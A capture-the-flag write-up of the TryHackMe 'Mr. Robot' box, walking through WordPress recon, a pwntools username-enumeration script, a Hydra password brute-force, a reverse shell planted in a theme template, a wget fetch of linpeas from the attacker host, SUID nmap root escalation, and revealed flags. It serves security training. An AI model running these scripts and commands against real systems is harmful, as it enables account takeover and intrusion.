---
title: "Mr. Robot"
link: "https://tryhackme.com/room/mrrobot"
description: "Based on the Mr. Robot show, can you root this box?"
author: "tryhackme"
date: "2023-04-09"
published: false
tags: ["capture the flag", "tryhackme", "web", "networks"]
---

# Mr. Robot

<aside>
<a href={link}>{title} @ {author}</a>
Based on the Mr. Robot show, can you root this box?
</aside>

## Recon

I start by using `nmap` to enumerate for open ports and services:

```bash
PORT    STATE  SERVICE  REASON         VERSION
22/tcp  closed ssh      reset ttl 61
80/tcp  open   http     syn-ack ttl 61 Apache httpd
|_http-title: Site doesn\'t have a title (text/html).
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
|_http-server-header: Apache
443/tcp open   ssl/http syn-ack ttl 61 Apache httpd
|_http-title: 400 Bad Request
| http-methods:
|_  Supported Methods: GET HEAD POST
| ssl-cert: Subject: commonName=www.example.com
| Issuer: commonName=www.example.com
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2015-09-16T10:45:03
| Not valid after:  2025-09-13T10:45:03
| MD5:   3c16 3b19 87c3 42ad 6634 c1c9 d0aa fb97
| SHA-1: ef0c 5fa5 931a 09a5 687c a2c2 80c4 c792 07ce f71b
| -----BEGIN CERTIFICATE-----
| MIIBqzCCARQCCQCgSfELirADCzANBgkqhkiG9w0BAQUFADAaMRgwFgYDVQQDDA93
| d3cuZXhhbXBsZS5jb20wHhcNMTUwOTE2MTA0NTAzWhcNMjUwOTEzMTA0NTAzWjAa
| MRgwFgYDVQQDDA93d3cuZXhhbXBsZS5jb20wgZ8wDQYJKoZIhvcNAQEBBQADgY0A
| MIGJAoGBANlxG/38e8Dy/mxwZzBboYF64tu1n8c2zsWOw8FFU0azQFxv7RPKcGwt
| sALkdAMkNcWS7J930xGamdCZPdoRY4hhfesLIshZxpyk6NoYBkmtx+GfwrrLh6mU
| yvsyno29GAlqYWfffzXRoibdDtGTn9NeMqXobVTTKTaR0BGspOS5AgMBAAEwDQYJ
| KoZIhvcNAQEFBQADgYEASfG0dH3x4/XaN6IWwaKo8XeRStjYTy/uBJEBUERlP17X
| 1TooZOYbvgFAqK8DPOl7EkzASVeu0mS5orfptWjOZ/UWVZujSNj7uu7QR4vbNERx
| ncZrydr7FklpkIN5Bj8SYc94JI9GsrHip4mpbystXkxncoOVESjRBES/iatbkl0=
|_-----END CERTIFICATE-----
|_http-server-header: Apache
```

We can also enumerate directories with a wordlist while investigating the HTTP service in a browser.

```bash
    /#....
    /.html                (Status: 403) [Size: 214]
    /index.html           (Status: 200) [Size: 1188]
    /images               (Status: 301) [Size: 236] [--> http://10.10.190.225/ima
    /index.php            (Status: 301) [Size: 0] [--> http://10.10.190.225/]
    /blog                 (Status: 301) [Size: 234] [--> http://10.10.190.225/blo
    /rss                  (Status: 301) [Size: 0] [--> http://10.10.190.225/feed/
    /sitemap              (Status: 200) [Size: 0]
    /login                (Status: 302) [Size: 0] [--> http://10.10.190.225/wp-lo
    /0                    (Status: 301) [Size: 0] [--> http://10.10.190.225/0/]
    /feed                 (Status: 301) [Size: 0] [--> http://10.10.190.225/feed/
    /video                (Status: 301) [Size: 235] [--> http://10.10.190.225/vid
    /image                (Status: 301) [Size: 0] [--> http://10.10.190.225/image
    /atom                 (Status: 301) [Size: 0] [--> http://10.10.190.225/feed/
    /wp-content           (Status: 301) [Size: 240] [--> http://10.10.190.225/wp-
    /admin                (Status: 301) [Size: 235] [--> http://10.10.190.225/adm
    /audio                (Status: 301) [Size: 235] [--> http://10.10.190.225/aud
    /intro                (Status: 200) [Size: 516314]
    /wp-login             (Status: 200) [Size: 2671]
    /wp-login.php         (Status: 200) [Size: 2671]
    /css                  (Status: 301) [Size: 233] [--> http://10.10.190.225/css
    /rss2                 (Status: 301) [Size: 0] [--> http://10.10.190.225/feed/
    /license              (Status: 200) [Size: 309]
    /license.txt          (Status: 200) [Size: 309]
    /wp-includes          (Status: 301) [Size: 241] [--> http://10.10.190.225/wp-
    /js                   (Status: 301) [Size: 232] [--> http://10.10.190.225/js/]
    /wp-register.php      (Status: 301) [Size: 0] [--> http://10.10.190.225/wp-login.php?action=register]
    /Image                (Status: 301) [Size: 0] [--> http://10.10.190.225/Image/]
    /robots               (Status: 200) [Size: 0] [--> /robots.txt]
    /xmlrpc.php           (Status: 405)
    /#...
```

The root directory on this box doesn't contain anything interesting.

Instead, we can turn to our `gobuster` scan, where we see a `robots.txt` and directories for a Wordpress CMS backend. The `robots.txt` gives us the filepath for our first flag
(`http://10.10.190.225/key-1-of-3.txt`), and a filepath for `fsocity.dic`; which is a long list of words. This turns out to be a list we can use to use to enumerate logins.

On `/wp-login.php`, we are able to check existing users through the "Lost your password?" link - entering an incorrect username will inform us that the username is incorrect.
turning back to our `fsocity.dic`, i noted that there were a lot of duplicate entries; if i wanted to use this list to perform enumeration, it would make it much quicker to cut this down to unique entries only.
This is really easy to do in python by converting the contents of the file to a set, which cannot contain duplicate entries:

```python
with open("fsocity.dic", "r") as f:
    lines = f.readlines()
unique_lines = set(lines)
with open("fsociety_uniquelines.txt", "w") as f:
    for line in unique_lines:
        f.write(line)
```

This shrunk it considerably - from 858,160 lines to just 11,451. We can see that a POST request with a non-existant username yields a div with `id='login_error'`, which we can use to invalidate a username's existance:

```html
<div id="login_error">
    <strong>ERROR</strong>: Invalid username or e-mail.<br/>
</div>
```

## Foothold

Using this information as well as the headers from this request, I wrote a (kind of janky) multithreaded python script using `pwntools` that will query the login page,
using the filtered `fsociety.dic` as a wordlist:

```python
from concurrent.futures import ThreadPoolExecutor
from pwn import *
import threading
import os
import logging

logging.getLogger('pwnlib').setLevel(logging.CRITICAL)
devnull = os.open(os.devnull, os.O_RDWR)
os.dup2(devnull, 2)

print_lock = threading.Lock()
count_lock = threading.Lock()
def checkname(username):
    global total_requests
    global invalid_responses
    global possible_hits
    r = remote('10.10.190.225', 80)
    r.send('POST /wp-login.php?action=lostpassword HTTP/1.1\r\n'
            'Host: Host: 10.10.190.225\r\n'
            'Content-Type: application/x-www-form-urlencoded\r\n'
            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36\r\n'
            'Cookie: wordpress_test_cookie=WP+Cookie+check\r\n'
            'Content-Length: {}\r\n\r\n'
            'user_login={}&redirect_to=&wp-submit=Get+New+Password\r\n'.format(len(username) + 11, username))
    with count_lock:
        total_requests += 1
        if total_requests % 100 == 0:
            with print_lock:
                print('Total requests:', total_requests)
                print('Invalid responses:', invalid_responses)
                print('currently with ', len(possible_hits), 'possible usernames')
    response = r.recvall()
    if not b'login_error' in response:
        with print_lock:
            print(f'possible hit --> {username} ')
            possible_hits.append(username)
    else:
        with count_lock:
            invalid_responses += 1
    r.close()

total_requests = 0
invalid_responses = 0
possible_hits = []
with open('fsociety_uniquelines.txt', 'r') as f:
    usernames = [line.strip() for line in f]
with ThreadPoolExecutor(max_workers=30) as executor:
    executor.map(checkname, usernames)
print(f'completed with {total_requests} total requests, and {invalid_responses} invalid username requests.')
print(f'possible usernames: {possible_hits}')
```

This could also be done (far quicker and easier) using Hydra, plus this python script seemed to have killed the (often frustratingly sensitive) THM machine.

Regardless, we get multiple hits for case variations on `elliot`, which likely means the login form is not case sensitive (if it was, we could add them to a file and iterate the file with hydra instead):

```bash
completed with 11451 total requests, and 11448 invalid username requests.
possible usernames: ['ELLIOT', 'Elliot', 'elliot']
```

After restarting the server, we can manually trying any of these users to validate that we didn't get random false positives:

```html
<body id="error-page">
	<p>The e-mail could not be sent.<br>
Possible reason: your host may have disabled the mail() function.</p>
</body>
```

We can now use Hydra to enumerate the password from the same file on the login page, which gives us a hit on elliot's password:

```bash
$ hydra -l elliot -P ./fsociety_uniquelines.txt 10.10.190.225 -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'

# ...

[80][http-post-form] host: 10.10.218.32   login: elliot   password: ER28-0652
```
Logging into the dashboard and poking around, like most CMS challenges, we likely want to look for a way to get a reverse shell callback. We can't upload files with a `.php` extension, but we can edit some of the
themes template pages, which seem to execute code, to include a reverse shell. The easiest way to do this is on the template's 404 error page, so we can replace the existing code with a reverse shell and navigate to
a nonexistant page to get into the box.

We see the sole `/home` dir user with, `robot`:

```bash
daemon@linux:/home$ ls -la
ls -la
total 12
drwxr-xr-x  3 root root 4096 Nov 13  2015 .
drwxr-xr-x 22 root root 4096 Sep 16  2015 ..
drwxr-xr-x  2 root root 4096 Nov 13  2015 robot
```

We have `r-x` perms over this directory and thus can move into it. Here, there are two files:

- `key-2-of-3.txt`
- `password.raw-md5`

```bash
daemon@linux:/home/robot$ ls -la
ls -la
total 16
drwxr-xr-x 2 root  root  4096 Nov 13  2015 .
drwxr-xr-x 3 root  root  4096 Nov 13  2015 ..
-r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
-rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5
```

We can't do anything with the flag file (`key-2-of-3.txt`) on account of permissions, but the `password.raw-md5` is probably just as interesting; I ultimately decided to give linpeas a quick go before coming back
to this with `hashcat`.

I `wget -o` the `linpeas` script down from my host machine, mark it as executable, and run it:
```bash
daemon@linux:/home/robot$ cd /dev/shm
cd /dev/shm
daemon@linux:/dev/shm$ wget -o- linpeas.sh http://10.4.23.161:4444/linpeas.sh
wget -o- linpeas.sh http://10.4.23.161:4444/linpeas.sh
```

Going over the results, we quickly see the `suid` bit is set on the `nmap` binary:

```sh
-rwsr-xr-x 1 root root 493K Nov 13  2015 /usr/local/bin/nmap
```
## Privilege Escalation

Taking a quick look at [the nmap page on gtfobins](https://gtfobins.github.io/gtfobins/nmap/#suid), we see that `nmap` versions `2.02` to `5.21` have an interactive mode, and can be used to execute shell commands:

```bash
nmap --interactive
nmap> !sh
```

The vulnerable `nmap` binary is not on system or user `PATH`, so we'll just navigate to it and check its version:

```bash
daemon@linux:/dev/shm$ nmap
nmap
bash: nmap: command not found
daemon@linux:/dev/shm$ cd /usr/local/bin
cd /usr/local/bin
daemon@linux:/usr/local/bin$ ./nmap --version
./nmap --version

nmap version 3.81 ( http://www.insecure.org/nmap/ )
```

Our binary is in the `--interactive` version range, so lets give the `nmap` jailbreak a go:

```bash
daemon@linux:/usr/local/bin$ ./nmap --interactive
./nmap --interactive

Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
whoami
root
```

And now we can navigate back to the flag (no hash cracking required):

```
cd home
cd robot
ls
key-2-of-3.txt
password.raw-md5
cat key-2-of-3.txt
822c73956184f694993bede3eb39f959
```

I assume that MD5 hash might've also contained a clue as to the whereabouts of the final flag, but considering we are currently `root`, we can just run `find` from the root dir:
```bash
cd ../../../../
find -type f | grep "key-3-of-3.txt"
find: `./proc/23622/task/23622/fd/8': No such file or directory
find: `./proc/23622/task/23622/fdinfo/8': No such file or directory
find: `./proc/23622/fd/8': No such file or directory
find: `./proc/23622/fdinfo/8': No such file or directory
./root/key-3-of-3.txt
cat ./root/key-3-of-3.txt
04787ddef27c3dee1ee161b21670b4e4
```
